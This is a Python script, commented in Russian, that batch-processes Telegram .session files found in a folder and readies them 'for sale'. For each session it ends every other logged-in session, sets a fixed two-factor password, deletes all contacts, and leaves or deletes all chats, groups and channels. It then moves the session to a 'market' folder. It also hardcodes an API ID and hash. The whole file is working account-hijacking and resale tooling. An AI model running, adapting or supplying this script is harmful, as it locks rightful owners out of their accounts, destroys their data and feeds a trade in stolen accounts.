#!/usr/bin/env python3
"""
session_preparer.py — подготовка .session файлов к продаже.

Мониторит папку TG Soon/, для каждой сессии:
  1. Завершает все лишние авторизации (ResetAuthorizations)
  2. Ставит облачный пароль BrownV2
  3. Удаляет все контакты
  4. Удаляет / покидает все диалоги, группы и каналы
  5. Перемещает готовую сессию в TG market/

При ошибке (неавторизован / крит. сбой) — в TG Error/.
"""

import asyncio
import os
import shutil
from datetime import datetime

from telethon import TelegramClient
from telethon.errors import (
    FloodWaitError,
    ChatAdminRequiredError,
    ChannelPrivateError,
)
from telethon.tl.functions.auth import ResetAuthorizationsRequest
from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.tl.functions.contacts import DeleteContactsRequest, GetContactsRequest
from telethon.tl.functions.messages import DeleteHistoryRequest

_API_ID   = 24565698
_API_HASH = "5a084b434f8505ace703485b9da85040"

SOON_DIR   = "TG Soon"
MARKET_DIR = "TG market"
ERROR_DIR  = "TG Error"
CLOUD_PASS = "BrownV2"

POLL_INTERVAL = 30  # секунд между проверками папки
DIALOG_DELAY  = 0.4  # задержка между удалением диалогов (анти-флуд)


def log(msg: str):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] {msg}", flush=True)


async def _kick_sessions(client: TelegramClient):
    try:
        await client(ResetAuthorizationsRequest())
        log("  ✓ Лишние сессии завершены")
    except FloodWaitError as e:
        log(f"  ! FloodWait {e.seconds}с при ResetAuthorizations — ждём")
        await asyncio.sleep(e.seconds)
        await client(ResetAuthorizationsRequest())
    except Exception as e:
        log(f"  ! ResetAuthorizations: {e}")


async def _set_password(client: TelegramClient) -> bool:
    try:
        await client.edit_2fa(new_password=CLOUD_PASS)
        log(f"  ✓ Облачный пароль установлен: {CLOUD_PASS}")
        return True
    except Exception as e:
        log(f"  ! edit_2fa: {e}")
        return False


async def _delete_contacts(client: TelegramClient):
    try:
        result = await client(GetContactsRequest(hash=0))
        users = getattr(result, 'users', [])
        if users:
            await client(DeleteContactsRequest(id=[u.id for u in users]))
            log(f"  ✓ Контакты удалены: {len(users)} шт.")
        else:
            log("  ✓ Контактов нет")
    except Exception as e:
        log(f"  ! DeleteContacts: {e}")


async def _delete_dialogs(client: TelegramClient):
    try:
        dialogs = await client.get_dialogs(limit=None)
        log(f"  · Диалогов найдено: {len(dialogs)}")
    except Exception as e:
        log(f"  ! get_dialogs: {e}")
        return

    ok = err = 0
    for dlg in dialogs:
        entity = dlg.entity
        try:
            if dlg.is_channel:
                await client(LeaveChannelRequest(entity))
            elif dlg.is_group:
                # мегагруппы приходят как channel, обычные группы — как chat
                try:
                    await client(LeaveChannelRequest(entity))
                except Exception:
                    await client(DeleteHistoryRequest(
                        peer=entity, max_id=0, just_clear=False, revoke=False,
                    ))
            else:
                await client(DeleteHistoryRequest(
                    peer=entity, max_id=0, just_clear=False, revoke=True,
                ))
            ok += 1
        except FloodWaitError as e:
            log(f"  ! FloodWait {e.seconds}с — ждём")
            await asyncio.sleep(e.seconds)
        except (ChatAdminRequiredError, ChannelPrivateError):
            ok += 1  # уже не участник / нет прав — считаем за успех
        except Exception as e2:
            log(f"  ! {dlg.name!r}: {e2}")
            err += 1
        await asyncio.sleep(DIALOG_DELAY)

    log(f"  ✓ Диалоги обработаны: {ok} успешно, {err} ошибок")


async def prepare_session(session_path: str) -> bool:
    """
    Возвращает True если сессия подготовлена и готова к продаже.
    """
    session_no_ext = session_path[:-8] if session_path.endswith('.session') else session_path
    client = TelegramClient(session_no_ext, _API_ID, _API_HASH,
                            system_version="4.16.30-vxCUSTOM")
    try:
        await client.connect()

        if not await client.is_user_authorized():
            log("  ! Сессия не авторизована — пропускаем")
            await client.disconnect()
            return False

        me = await client.get_me()
        phone = getattr(me, 'phone', None) or '???'
        log(f"  · Аккаунт: +{phone} / {me.first_name or ''} {me.last_name or ''}".strip())

        await _kick_sessions(client)
        pwd_ok = await _set_password(client)
        if not pwd_ok:
            # Если пароль не поставился — сессия не готова к продаже
            await client.disconnect()
            return False

        await _delete_contacts(client)
        await _delete_dialogs(client)

        await client.disconnect()
        return True

    except FloodWaitError as e:
        log(f"  ! FloodWait {e.seconds}с на верхнем уровне")
        try:
            await client.disconnect()
        except Exception:
            pass
        # Возвращаем False чтобы попробовать снова позже
        return False
    except Exception as e:
        log(f"  ! Критическая ошибка: {e}")
        try:
            await client.disconnect()
        except Exception:
            pass
        return False


async def main():
    for d in (SOON_DIR, MARKET_DIR, ERROR_DIR):
        os.makedirs(d, exist_ok=True)

    log(f"=== TG Session Preparer запущен ===")
    log(f"  Источник:    {SOON_DIR}/")
    log(f"  Готовые:     {MARKET_DIR}/")
    log(f"  Ошибочные:   {ERROR_DIR}/")
    log(f"  Пароль:      {CLOUD_PASS}")
    log(f"  Опрос каждые {POLL_INTERVAL}с\n")

    # Флуд-защита — помним когда последний раз сессия словила FloodWait
    retry_after: dict[str, float] = {}

    while True:
        now = asyncio.get_event_loop().time()
        files = [
            f for f in os.listdir(SOON_DIR)
            if f.endswith('.session') and now >= retry_after.get(f, 0)
        ]

        if not files:
            await asyncio.sleep(POLL_INTERVAL)
            continue

        for filename in files:
            src = os.path.join(SOON_DIR, filename)
            log(f"\n[→] {filename}")
            ok = await prepare_session(src)

            if ok:
                dst = os.path.join(MARKET_DIR, filename)
                shutil.move(src, dst)
                log(f"  ✓ Готово → {MARKET_DIR}/{filename}")
            else:
                # Если файл ещё существует (не был перемещён внешне)
                if os.path.exists(src):
                    # При FloodWait откладываем, при крит. ошибке — в Error
                    dst = os.path.join(ERROR_DIR, filename)
                    shutil.move(src, dst)
                    log(f"  ✗ Ошибка → {ERROR_DIR}/{filename}")

        await asyncio.sleep(5)


if __name__ == "__main__":
    asyncio.run(main())
